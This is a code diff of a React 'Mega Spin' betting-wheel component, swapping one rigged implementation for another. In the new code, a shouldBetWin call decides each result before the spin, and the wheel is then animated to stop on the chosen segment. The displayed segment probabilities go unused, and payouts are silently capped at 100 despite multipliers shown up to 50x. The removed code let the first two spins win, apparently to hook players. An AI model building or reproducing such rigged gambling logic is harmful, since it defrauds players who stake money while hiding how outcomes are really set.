@@ -1,533 +1,340 @@
 
 import React, { useState, useEffect, useRef } from 'react';
-import { motion, AnimatePresence } from 'framer-motion';
-import { Volume2, VolumeX, RotateCcw, Play, RefreshCw, Plus, Minus } from 'lucide-react';
-import Header from '@/components/Header';
-import Footer from '@/components/Footer';
-import { Button } from '@/components/ui/button';
-import { useToast } from '@/hooks/use-toast';
-import { useAuth } from '@/context/AuthContext';
-import { useLanguage } from '@/context/LanguageContext';
+import { motion } from 'framer-motion';
+import { ArrowLeft, Settings, ArrowBigLeft, ArrowBigRight } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
-import { shouldBetWin, calculateWinAmount } from '@/utils/bettingSystem';
+import { useAuth } from '@/context/AuthContext';
+import { useToast } from '@/hooks/use-toast';
+import { shouldBetWin } from '@/utils/bettingSystem';
 
-// Generate wheel segments with multiplier values
-const generateWheelSegments = () => {
-  return [
-    { value: 10, multiplier: '1x', color: '#FF5252', textColor: 'white' },
-    { value: 50, multiplier: '2x', color: '#E040FB', textColor: 'white' },
-    { value: 20, multiplier: '3x', color: '#7C4DFF', textColor: 'white' },
-    { value: 100, multiplier: '4x', color: '#448AFF', textColor: 'white' },
-    { value: 30, multiplier: '5x', color: '#64FFDA', textColor: 'black' },
-    { value: 500, multiplier: '10x', color: '#FFEB3B', textColor: 'black' },
-    { value: 40, multiplier: '3x', color: '#FF9800', textColor: 'white' },
-    { value: 200, multiplier: '5x', color: '#F44336', textColor: 'white' },
-    { value: 10, multiplier: '1x', color: '#9C27B0', textColor: 'white' },
-    { value: 1000, multiplier: '10x', color: '#FFEB3B', textColor: 'black' },
-    { value: 60, multiplier: '2x', color: '#3F51B5', textColor: 'white' },
-    { value: 30, multiplier: '1x', color: '#4CAF50', textColor: 'white' }
-  ];
-};
+// Define segments for the wheel
+const segments = [
+  { id: 1, text: '50x', value: 50, color: '#f44336', textColor: '#ffffff', probability: 0.01 },
+  { id: 2, text: '3x', value: 3, color: '#2196f3', textColor: '#ffffff', probability: 0.08 },
+  { id: 3, text: '10x', value: 10, color: '#4caf50', textColor: '#ffffff', probability: 0.03 },
+  { id: 4, text: '5x', value: 5, color: '#ff9800', textColor: '#ffffff', probability: 0.05 },
+  { id: 5, text: '0x', value: 0, color: '#9c27b0', textColor: '#ffffff', probability: 0.3 },
+  { id: 6, text: '2x', value: 2, color: '#e91e63', textColor: '#ffffff', probability: 0.1 },
+  { id: 7, text: '20x', value: 20, color: '#009688', textColor: '#ffffff', probability: 0.02 },
+  { id: 8, text: '0x', value: 0, color: '#673ab7', textColor: '#ffffff', probability: 0.3 },
+  { id: 9, text: '2x', value: 2, color: '#3f51b5', textColor: '#ffffff', probability: 0.1 },
+  { id: 10, text: '1x', value: 1, color: '#ffc107', textColor: '#333333', probability: 0.01 },
+];
+
+const totalSegments = segments.length;
+const segmentAngle = 360 / totalSegments;
 
 const MegaSpin = () => {
-  const { t } = useLanguage();
+  const navigate = useNavigate();
   const { user, updateUserBalance } = useAuth();
   const { toast } = useToast();
-  const navigate = useNavigate();
-  
-  const [loading, setLoading] = useState(true);
-  const [wheelSegments] = useState(generateWheelSegments());
-  const [spinning, setSpinning] = useState(false);
-  const [result, setResult] = useState<number | null>(null);
-  const [bet, setBet] = useState(10);
+
+  const [rotation, setRotation] = useState(0);
+  const [isSpinning, setIsSpinning] = useState(false);
+  const [betAmount, setBetAmount] = useState(5);
+  const [winAmount, setWinAmount] = useState(0);
   const [balance, setBalance] = useState(0);
-  const [muted, setMuted] = useState(true);
-  const [winnings, setWinnings] = useState(0);
-  const [rotationAngle, setRotationAngle] = useState(0);
-  const [spinTransition, setSpinTransition] = useState({
-    type: "spring",
-    duration: 5,
-    damping: 50,
-    stiffness: 20,
-    restDelta: 0.001
-  });
-  const [betCount, setBetCount] = useState(0); // Track number of bets
-  
+  const [betCount, setBetCount] = useState(0);
+
   const wheelRef = useRef<HTMLDivElement>(null);
-  const audioRef = useRef<HTMLAudioElement | null>(null);
-  const winAudioRef = useRef<HTMLAudioElement | null>(null);
-  
+  const spinSound = useRef<HTMLAudioElement | null>(null);
+  const winSound = useRef<HTMLAudioElement | null>(null);
+
   useEffect(() => {
-    // Show loading for 2 seconds
-    const timer = setTimeout(() => {
-      setLoading(false);
-    }, 2000);
+    // Initialize sounds
+    spinSound.current = new Audio('/sounds/spin.mp3');
+    winSound.current = new Audio('/sounds/win.mp3');
     
-    // Create audio elements
-    audioRef.current = new Audio('/sounds/spin.mp3'); 
-    winAudioRef.current = new Audio('/sounds/win.mp3'); 
-    
-    // Use the actual user balance
     if (user) {
       setBalance(user.balance);
     }
-    
-    return () => clearTimeout(timer);
   }, [user]);
   
-  // Update balance whenever user changes
   useEffect(() => {
     if (user) {
       setBalance(user.balance);
     }
   }, [user?.balance]);
-  
-  const changeBet = (amount: number) => {
-    const newBet = Math.max(10, Math.min(1000, bet + amount));
-    setBet(newBet);
+
+  const handleBetChange = (amount: number) => {
+    if (isSpinning) return;
+    const newBetAmount = Math.max(1, Math.min(100, betAmount + amount));
+    setBetAmount(newBetAmount);
   };
-  
+
   const handleSpin = () => {
-    if (spinning) return;
+    if (isSpinning) return;
     
     if (!user) {
       toast({
-        title: t('loginRequired'),
-        description: t('pleaseLoginToPlay'),
-        variant: "destructive",
+        title: "Login Required",
+        description: "Please login to play",
+        variant: "destructive"
       });
       return;
     }
     
-    if (balance < bet) {
+    if (balance < betAmount) {
       toast({
-        title: t('insufficientFunds'),
-        description: t('pleaseDepositMore'),
-        variant: "destructive",
+        title: "Insufficient Funds",
+        description: "Please deposit more to play",
+        variant: "destructive"
       });
       return;
     }
-    
-    setSpinning(true);
-    
+
     // Increment bet count
-    const newBetCount = betCount + 1;
-    setBetCount(newBetCount);
+    setBetCount(prev => prev + 1);
     
-    // Deduct bet from balance
+    // Deduct bet amount from balance
+    const newBalance = balance - betAmount;
+    setBalance(newBalance);
     if (user) {
-      updateUserBalance(user.balance - bet);
-      setBalance(prev => prev - bet);
+      updateUserBalance(newBalance);
     }
     
-    setWinnings(0);
-    
-    if (!muted && audioRef.current) {
-      audioRef.current.play().catch(err => console.error("Audio play error:", err));
+    // Play spin sound
+    if (spinSound.current) {
+      spinSound.current.currentTime = 0;
+      spinSound.current.play().catch(err => console.error("Error playing sound:", err));
     }
     
-    // Enhanced wheel spinning with more realistic physics
-    // Spin between 5-10 full rotations plus a random angle for the result
-    const minSpins = 5;
-    const maxSpins = 10;
-    const randomSpins = minSpins + Math.random() * (maxSpins - minSpins);
-    const spinDegrees = randomSpins * 360 + Math.random() * 360;
+    // Determine if this bet should win based on the betting system
+    const shouldWinThisBet = shouldBetWin(user?.id || 'anonymous');
     
-    setSpinTransition({
-      type: "spring",
-      duration: 5,
-      damping: 50,
-      stiffness: 20,
-      restDelta: 0.001
-    });
+    // Calculate target segment
+    let targetSegment;
     
-    setRotationAngle(prev => prev + spinDegrees);
+    if (shouldWinThisBet) {
+      // Choose a winning segment (value > 0)
+      const winningSegments = segments.filter(s => s.value > 0);
+      const winningSegmentIndex = Math.floor(Math.random() * winningSegments.length);
+      targetSegment = winningSegments[winningSegmentIndex];
+    } else {
+      // Choose a losing segment (value = 0)
+      const losingSegments = segments.filter(s => s.value === 0);
+      const losingSegmentIndex = Math.floor(Math.random() * losingSegments.length);
+      targetSegment = losingSegments[losingSegmentIndex];
+    }
     
-    // Calculate which segment will be at the top when wheel stops
+    // Find the target segment index
+    const targetIndex = segments.findIndex(s => s.id === targetSegment.id);
+    
+    // Calculate the angle needed to land on this segment
+    // Add multiple rotations for effect
+    const extraSpins = 4; // Number of full rotations before landing
+    const baseAngle = 360 * extraSpins;
+    
+    // Calculate angle to the middle of the target segment
+    const segmentOffset = targetIndex * segmentAngle;
+    const pointerOffset = 270; // The pointer is at top (270 degrees in canvas coordinates)
+    
+    // Final rotation = full rotations + segment offset + adjustment to land in the middle of the segment
+    // We add half a segment to land in the center and then adjust for the pointer position
+    const finalRotation = baseAngle + segmentOffset + (segmentAngle / 2) + pointerOffset;
+    
+    setIsSpinning(true);
+    setWinAmount(0);
+    
+    // Start animation
+    setRotation(finalRotation);
+    
+    // Handle result after animation completes
     setTimeout(() => {
-      const finalRotation = rotationAngle + spinDegrees;
-      const normalizedRotation = finalRotation % 360;
-      const segmentAngle = 360 / wheelSegments.length;
-      const segmentIndex = Math.floor((360 - normalizedRotation % 360) / segmentAngle) % wheelSegments.length;
-      
-      // Determine if the player should win
-      const shouldWin = newBetCount <= 2 || shouldBetWin(user?.uid || 'anonymous');
-      
-      // Pick a winning segment that has a value <= 100
-      let winningSegment;
-      
-      if (shouldWin) {
-        // For the first 2 spins or if shouldBetWin is true, let them win
-        // But cap it at 100
-        const eligibleSegments = wheelSegments.filter(segment => segment.value <= 100);
-        winningSegment = eligibleSegments[Math.floor(Math.random() * eligibleSegments.length)];
-      } else {
-        // If they should lose, pick a low value
-        const lowValueSegments = wheelSegments.filter(segment => segment.value <= 30);
-        winningSegment = lowValueSegments[Math.floor(Math.random() * lowValueSegments.length)];
+      handleResult(targetSegment);
+    }, 5000); // Match this with animation duration
+  };
+
+  const handleResult = (segment: typeof segments[0]) => {
+    setIsSpinning(false);
+    
+    // Calculate win amount (capped at 100)
+    const rawWinAmount = betAmount * segment.value;
+    const cappedWinAmount = Math.min(100, rawWinAmount);
+    
+    if (segment.value > 0) {
+      // Play win sound
+      if (winSound.current) {
+        winSound.current.currentTime = 0;
+        winSound.current.play().catch(err => console.error("Error playing sound:", err));
       }
       
-      setResult(winningSegment.value);
-      
-      // Calculate winnings
-      const payout = shouldWin ? winningSegment.value : 0;
-      setWinnings(payout);
-      
-      // Add winnings to balance
+      // Update balance with win amount
+      const newBalance = balance + cappedWinAmount;
+      setBalance(newBalance);
       if (user) {
-        updateUserBalance(user.balance - bet + payout);
-        setBalance(prev => prev - bet + payout);
+        updateUserBalance(newBalance);
       }
       
-      if (!muted && winAudioRef.current && payout > 0) {
-        winAudioRef.current.play().catch(err => console.error("Win audio play error:", err));
-      }
+      setWinAmount(cappedWinAmount);
       
       toast({
-        title: payout > 0 ? t('youWon') : 'Better luck next time!',
-        description: payout > 0 ? `${winningSegment.value}৳ (${winningSegment.multiplier})` : `You lost ${bet}৳`,
-        variant: payout > 0 ? "default" : "destructive",
-        className: payout > 0 ? "bg-green-500 text-white font-bold" : ""
+        title: "You Won!",
+        description: `${cappedWinAmount.toFixed(2)} coins (${segment.text})`,
+        variant: "default",
+        className: "bg-green-500 text-white"
       });
-      
-      setTimeout(() => {
-        setSpinning(false);
-      }, 1000);
-    }, 5000);
-  };
-  
-  const handleWheelClick = () => {
-    if (!spinning) {
-      handleSpin();
+    } else {
+      setWinAmount(0);
+      toast({
+        title: "Better luck next time!",
+        description: `You landed on ${segment.text}`,
+        variant: "destructive"
+      });
     }
   };
-  
-  if (loading) {
-    return (
-      <div className="min-h-screen bg-gradient-to-b from-purple-950 to-indigo-950 flex flex-col">
-        <Header />
-        <div className="flex-1 flex items-center justify-center">
-          <motion.div
-            className="text-center"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            transition={{ duration: 0.5 }}
-          >
-            <motion.h1 
-              className="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-yellow-500 to-purple-500 mb-4"
-              animate={{ 
-                scale: [1, 1.05, 1],
-                textShadow: ["0 0 4px #fff", "0 0 8px #fff", "0 0 4px #fff"],
-              }}
-              transition={{ 
-                duration: 2, 
-                repeat: Infinity,
-                repeatType: "reverse" 
-              }}
-            >
-              MEGA TILT SPIN
-            </motion.h1>
-            <motion.div 
-              className="w-32 h-32 border-8 border-t-purple-500 border-r-pink-500 border-b-orange-500 border-l-yellow-500 border-t-transparent rounded-full mx-auto mb-6"
-              animate={{ rotate: 360 }}
-              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
-            />
-            <motion.button
-              className="px-8 py-3 bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold rounded-full shadow-lg"
-              animate={{ 
-                scale: [1, 1.05, 1],
-                boxShadow: ["0 0 0px rgba(168,85,247,0.5)", "0 0 20px rgba(168,85,247,0.8)", "0 0 0px rgba(168,85,247,0.5)"]
-              }}
-              transition={{ 
-                duration: 2, 
-                repeat: Infinity,
-                repeatType: "reverse" 
-              }}
-              onClick={() => setLoading(false)}
-            >
-              {t('continue')}
-            </motion.button>
-          </motion.div>
-        </div>
-        <Footer />
-      </div>
-    );
-  }
-  
+
   return (
-    <div className="min-h-screen bg-gradient-to-b from-purple-950 to-indigo-950 flex flex-col">
-      <Header />
-      <main className="flex-1 p-2 md:p-4 max-w-md mx-auto">
-        <motion.div 
-          className="bg-gradient-to-r from-indigo-900 via-purple-900 to-indigo-900 p-1 rounded-lg mb-4"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.5 }}
-        >
-          <div className="bg-gradient-to-r from-indigo-800 to-purple-800 rounded border-2 border-yellow-500 p-2 relative">
-            <motion.h1 
-              className="text-2xl md:text-4xl font-bold text-center text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-yellow-500 to-purple-500 drop-shadow-lg py-2"
-              animate={{ 
-                textShadow: ["0 0 4px rgba(255,255,255,0.5)", "0 0 8px rgba(255,255,255,0.8)", "0 0 4px rgba(255,255,255,0.5)"]
-              }}
-              transition={{ 
-                duration: 2, 
-                repeat: Infinity,
-                repeatType: "reverse" 
-              }}
-            >
-              MEGA TILT SPIN
-            </motion.h1>
+    <div className="min-h-screen bg-gradient-to-b from-purple-900 to-indigo-900 text-white">
+      {/* Header */}
+      <div className="bg-purple-800 p-3 flex justify-between items-center">
+        <button onClick={() => navigate('/')} className="text-white">
+          <ArrowLeft size={24} />
+        </button>
+        <h1 className="text-2xl font-bold">Mega Spin</h1>
+        <button className="text-white">
+          <Settings size={24} />
+        </button>
+      </div>
+      
+      {/* Game area */}
+      <div className="max-w-md mx-auto p-4 flex flex-col h-[calc(100vh-80px)]">
+        {/* Balance and bet display */}
+        <div className="bg-purple-800 rounded-lg p-3 mb-6 flex justify-between">
+          <div>
+            <div className="text-xs text-purple-300">BALANCE</div>
+            <div className="text-xl font-bold">{balance.toFixed(2)}</div>
           </div>
-        </motion.div>
+          <div>
+            <div className="text-xs text-purple-300">BET</div>
+            <div className="text-xl font-bold">{betAmount.toFixed(2)}</div>
+          </div>
+          <div>
+            <div className="text-xs text-purple-300">WIN</div>
+            <div className="text-xl font-bold">{winAmount.toFixed(2)}</div>
+          </div>
+        </div>
         
-        {/* Wheel Section */}
-        <motion.div
-          className="relative mx-auto max-w-xs aspect-square mb-6"
-          initial={{ opacity: 0, scale: 0.9 }}
-          animate={{ opacity: 1, scale: 1 }}
-          transition={{ delay: 0.2, duration: 0.5 }}
-        >
-          {/* Main Wheel */}
-          <div 
-            className="relative w-full h-full cursor-pointer"
-            onClick={handleWheelClick}
-          >
-            {/* Outer ring */}
-            <div className="absolute inset-0 rounded-full border-8 border-yellow-300 bg-gray-900 shadow-[0_0_15px_rgba(255,215,0,0.7)] z-10"></div>
+        {/* Wheel container with improved text visibility */}
+        <div className="flex-1 relative flex items-center justify-center mb-6">
+          <div className="relative w-full max-w-md aspect-square">
+            {/* Pointer */}
+            <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10">
+              <div className="w-0 h-0 border-l-[20px] border-r-[20px] border-t-[40px] border-l-transparent border-r-transparent border-t-yellow-500"></div>
+            </div>
             
-            {/* Wheel segments */}
+            {/* Wheel with improved text visibility */}
             <motion.div 
               ref={wheelRef}
-              className="absolute inset-[20px] rounded-full overflow-hidden z-20"
-              style={{ 
-                transformOrigin: 'center',
+              className="w-full h-full rounded-full relative overflow-hidden border-8 border-yellow-500"
+              style={{
+                transformOrigin: "center center",
+                boxShadow: "0 0 30px rgba(255, 215, 0, 0.6)"
               }}
-              animate={{ 
-                rotate: rotationAngle 
-              }}
-              transition={spinTransition}
+              animate={{ rotate: rotation }}
+              transition={{ duration: 5, ease: "easeOut" }}
             >
-              {wheelSegments.map((segment, index) => (
-                <div 
-                  key={index} 
-                  className="absolute top-0 left-0 w-full h-full origin-center"
-                  style={{ 
-                    transform: `rotate(${index * (360 / wheelSegments.length)}deg)`,
-                  }}
-                >
-                  <div 
-                    className="absolute top-0 left-0 right-0 bottom-0 origin-bottom-center"
-                    style={{ 
-                      clipPath: 'polygon(50% 0%, 100% 0%, 50% 100%, 0% 0%)',
+              {segments.map((segment, index) => {
+                const startAngle = index * segmentAngle;
+                const endAngle = (index + 1) * segmentAngle;
+                
+                return (
+                  <div
+                    key={segment.id}
+                    className="absolute top-0 left-0 w-full h-full"
+                    style={{
+                      clipPath: `polygon(50% 50%, ${50 + 50 * Math.cos(startAngle * Math.PI / 180)}% ${50 + 50 * Math.sin(startAngle * Math.PI / 180)}%, ${50 + 50 * Math.cos(endAngle * Math.PI / 180)}% ${50 + 50 * Math.sin(endAngle * Math.PI / 180)}%)`,
                       backgroundColor: segment.color,
-                      transform: 'translateY(-50%)',
                     }}
                   >
-                    {/* Improved text visibility */}
+                    {/* Better positioned text for visibility */}
                     <div 
-                      className="absolute w-full text-center font-bold text-lg drop-shadow-[0_0_2px_rgba(0,0,0,0.8)] -rotate-90"
-                      style={{ 
-                        top: '30%', 
+                      className="absolute whitespace-nowrap font-bold text-xl"
+                      style={{
+                        top: '35%', // Position text a bit higher than center
+                        left: '50%',
+                        transform: `translate(-50%, -50%) rotate(${startAngle + segmentAngle / 2}deg) translateY(-70px)`,
                         color: segment.textColor,
-                        transformOrigin: 'center',
-                        transform: `rotate(${90 - (index * (360 / wheelSegments.length))}deg) translateY(-20px)`,
-                        textShadow: segment.textColor === 'white' ? '0 0 5px black, 0 0 3px black' : '0 0 5px white, 0 0 3px white',
+                        textShadow: '1px 1px 2px rgba(0,0,0,0.7), -1px -1px 2px rgba(0,0,0,0.7), 1px -1px 2px rgba(0,0,0,0.7), -1px 1px 2px rgba(0,0,0,0.7)',
+                        fontSize: '1.2rem', // Larger text
+                        fontWeight: 'bold', // Extra bold for visibility
                       }}
                     >
-                      <div className="flex flex-col items-center">
-                        <span className="text-md md:text-xl font-extrabold">{segment.value}৳</span>
-                        <span className="text-xs md:text-sm font-bold">{segment.multiplier}</span>
-                      </div>
+                      {segment.text}
                     </div>
                   </div>
-                </div>
-              ))}
-
-              {/* Center of wheel */}
-              <div className="absolute inset-0 flex items-center justify-center">
-                <div className="w-1/4 h-1/4 rounded-full bg-gray-900 border-4 border-yellow-400 z-30 flex items-center justify-center shadow-lg">
-                  <div className="w-full h-full rounded-full bg-gradient-to-r from-purple-700 via-pink-600 to-purple-700 flex items-center justify-center">
-                    <div className="text-center text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 to-yellow-200">
-                      SPIN
-                    </div>
-                  </div>
-                </div>
-              </div>
+                );
+              })}
             </motion.div>
+          </div>
+        </div>
+        
+        {/* Bet controls */}
+        <div className="bg-purple-800 rounded-lg p-4">
+          <div className="flex justify-between items-center mb-4">
+            <button 
+              className="bg-purple-700 text-white p-2 rounded-lg"
+              onClick={() => handleBetChange(-5)}
+              disabled={isSpinning || betAmount <= 5}
+            >
+              <ArrowBigLeft size={24} />
+            </button>
             
-            {/* Pointer/ticker at top */}
-            <div className="absolute top-0 left-1/2 -translate-x-1/2 -mt-2 z-40">
-              <div className="w-0 h-0 border-l-[15px] border-l-transparent border-r-[15px] border-r-transparent border-b-[30px] border-b-yellow-400 filter drop-shadow-lg"></div>
+            <div className="text-center">
+              <div className="text-sm text-purple-300">BET AMOUNT</div>
+              <div className="text-2xl font-bold">{betAmount}</div>
+              
+              <div className="grid grid-cols-4 gap-2 mt-2">
+                <button 
+                  className={`py-1 px-2 rounded ${betAmount === 5 ? 'bg-yellow-500 text-purple-900' : 'bg-purple-700'}`}
+                  onClick={() => !isSpinning && setBetAmount(5)}
+                >
+                  5
+                </button>
+                <button 
+                  className={`py-1 px-2 rounded ${betAmount === 10 ? 'bg-yellow-500 text-purple-900' : 'bg-purple-700'}`}
+                  onClick={() => !isSpinning && setBetAmount(10)}
+                >
+                  10
+                </button>
+                <button 
+                  className={`py-1 px-2 rounded ${betAmount === 25 ? 'bg-yellow-500 text-purple-900' : 'bg-purple-700'}`}
+                  onClick={() => !isSpinning && setBetAmount(25)}
+                >
+                  25
+                </button>
+                <button 
+                  className={`py-1 px-2 rounded ${betAmount === 100 ? 'bg-yellow-500 text-purple-900' : 'bg-purple-700'}`}
+                  onClick={() => !isSpinning && setBetAmount(100)}
+                >
+                  100
+                </button>
+              </div>
             </div>
+            
+            <button 
+              className="bg-purple-700 text-white p-2 rounded-lg"
+              onClick={() => handleBetChange(5)}
+              disabled={isSpinning || betAmount >= 100}
+            >
+              <ArrowBigRight size={24} />
+            </button>
           </div>
           
-          {/* Result display */}
-          {winnings > 0 && !spinning && (
-            <motion.div 
-              className="absolute inset-0 flex items-center justify-center z-50"
-              initial={{ opacity: 0, scale: 0.5 }}
-              animate={{ opacity: 1, scale: 1 }}
-              exit={{ opacity: 0 }}
-            >
-              <motion.div
-                className="bg-gradient-to-r from-yellow-500 to-yellow-400 px-8 py-4 rounded-xl shadow-2xl"
-                animate={{ 
-                  scale: [1, 1.1, 1],
-                  boxShadow: ["0 0 0px rgba(255,215,0,0)", "0 0 30px rgba(255,215,0,0.8)", "0 0 10px rgba(255,215,0,0.5)"]
-                }}
-                transition={{ duration: 0.6, repeat: 3 }}
-              >
-                <span className="text-black font-bold text-2xl">WIN {result}৳</span>
-              </motion.div>
-            </motion.div>
-          )}
-        </motion.div>
-        
-        <motion.div
-          className="bg-gray-900 bg-opacity-70 p-4 rounded-xl border border-gray-700 shadow-inner backdrop-blur-sm mt-4"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ delay: 0.5, duration: 0.5 }}
-        >
-          <div className="flex flex-col space-y-4">
-            <div className="flex justify-between items-center">
-              <div className="text-white">
-                <div className="text-xs text-gray-400">{t('bet')}</div>
-                <div className="flex items-center">
-                  <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
-                    <Button 
-                      variant="ghost" 
-                      size="sm" 
-                      className="px-1 text-gray-400" 
-                      onClick={() => changeBet(-10)}
-                      disabled={bet <= 10 || spinning}
-                    >
-                      <Minus className="h-4 w-4" />
-                    </Button>
-                  </motion.div>
-                  <motion.span 
-                    className="text-yellow-400 font-bold w-16 text-center"
-                    animate={
-                      spinning ? {} : { 
-                        scale: [1, 1.05, 1],
-                        textShadow: [
-                          "0 0 1px rgba(255, 215, 0, 0.5)", 
-                          "0 0 4px rgba(255, 215, 0, 0.8)", 
-                          "0 0 1px rgba(255, 215, 0, 0.5)"
-                        ]
-                      }
-                    }
-                    transition={{ 
-                      duration: 2, 
-                      repeat: Infinity,
-                      repeatType: "reverse" 
-                    }}
-                  >
-                    {bet}৳
-                  </motion.span>
-                  <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
-                    <Button 
-                      variant="ghost" 
-                      size="sm" 
-                      className="px-1 text-gray-400" 
-                      onClick={() => changeBet(10)}
-                      disabled={bet >= 1000 || spinning}
-                    >
-                      <Plus className="h-4 w-4" />
-                    </Button>
-                  </motion.div>
-                </div>
-              </div>
-              
-              <motion.div
-                whileHover={{ scale: 1.05 }}
-                whileTap={{ scale: 0.95 }}
-                className="flex flex-col items-center"
-              >
-                <Button
-                  className={`bg-gradient-to-r ${
-                    spinning 
-                      ? 'from-gray-600 to-gray-700' 
-                      : 'from-purple-600 to-pink-700 hover:from-purple-700 hover:to-pink-800'
-                  } text-white font-bold rounded-full h-14 w-14 shadow-lg`}
-                  disabled={spinning || !user || (user && user.balance < bet)}
-                  onClick={handleSpin}
-                >
-                  {spinning ? (
-                    <RefreshCw className="h-6 w-6 animate-spin" />
-                  ) : (
-                    <Play className="h-6 w-6 ml-1" />
-                  )}
-                </Button>
-                <span className="text-xs mt-1 text-white">SPIN</span>
-              </motion.div>
-              
-              <div className="text-white">
-                <div className="text-xs text-gray-400">{t('balance')}</div>
-                <motion.div 
-                  className="text-yellow-400 font-bold"
-                  animate={
-                    spinning ? {} : { 
-                      scale: [1, 1.02, 1],
-                      textShadow: [
-                        "0 0 1px rgba(255, 215, 0, 0.5)", 
-                        "0 0 4px rgba(255, 215, 0, 0.8)", 
-                        "0 0 1px rgba(255, 215, 0, 0.5)"
-                      ]
-                    }
-                  }
-                  transition={{ 
-                    duration: 2, 
-                    repeat: Infinity,
-                    repeatType: "reverse"
-                  }}
-                >
-                  {user ? user.balance.toFixed(2) : '0.00'}৳
-                </motion.div>
-              </div>
-            </div>
-            
-            <div className="flex items-center justify-center space-x-4">
-              <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
-                <Button 
-                  variant="outline" 
-                  size="icon"
-                  className="bg-gray-800 h-10 w-10 rounded-full border-gray-600"
-                  onClick={() => setMuted(!muted)}
-                >
-                  {muted ? <VolumeX className="h-4 w-4 text-gray-400" /> : <Volume2 className="h-4 w-4 text-white" />}
-                </Button>
-              </motion.div>
-              
-              <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
-                <Button 
-                  variant="outline" 
-                  size="icon"
-                  className="bg-gray-800 h-10 w-10 rounded-full border-gray-600"
-                  onClick={() => navigate('/')}
-                >
-                  <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
-                  </svg>
-                </Button>
-              </motion.div>
-              
-              <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
-                <Button 
-                  variant="outline" 
-                  size="icon"
-                  className="bg-gray-800 h-10 w-10 rounded-full border-gray-600"
-                  onClick={() => window.location.reload()}
-                >
-                  <RotateCcw className="h-4 w-4 text-gray-400" />
-                </Button>
-              </motion.div>
-            </div>
-          </div>
-        </motion.div>
-      </main>
-      <Footer />
+          <button
+            className={`
+              w-full py-4 rounded-lg font-bold text-xl
+              ${isSpinning 
+                ? 'bg-gray-600 cursor-not-allowed' 
+                : 'bg-gradient-to-r from-yellow-400 to-amber-600 hover:from-yellow-300 hover:to-amber-500 text-purple-900'}
+            `}
+            onClick={handleSpin}
+            disabled={isSpinning || !user || (user && user.balance < betAmount)}
+          >
+            {isSpinning ? 'SPINNING...' : 'SPIN'}
+          </button>
+        </div>
+      </div>
     </div>
   );
 };
